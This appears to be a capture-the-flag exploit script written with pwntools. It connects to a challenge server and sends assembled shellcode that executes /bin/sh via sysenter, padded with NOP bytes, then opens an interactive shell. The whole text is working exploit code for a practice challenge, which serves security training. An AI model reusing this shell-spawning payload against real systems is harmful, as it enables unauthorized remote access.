from pwn import *
import os 
context.arch = 'amd64'
os.environ['PATH']='/usr/bin'
#r = process('./chal')
#r = gdb.debug('./chal', 'b *main+474')
r = remote('chal.amt.rs', 1341)
shellcode = asm('''
mov eax, 0x0b 
lea ebx, [eip+binsh]
xor ecx, ecx 
xor edx, edx 
lea ebp, [eip+binsh] /* does not matter we just need a valid rbp value */
sysenter 
binsh: .asciz "/bin/sh"
''', vma=0x1337000)
r.sendline(shellcode+(b'\x90'*(0x1000-len(shellcode))))
r.interactive()


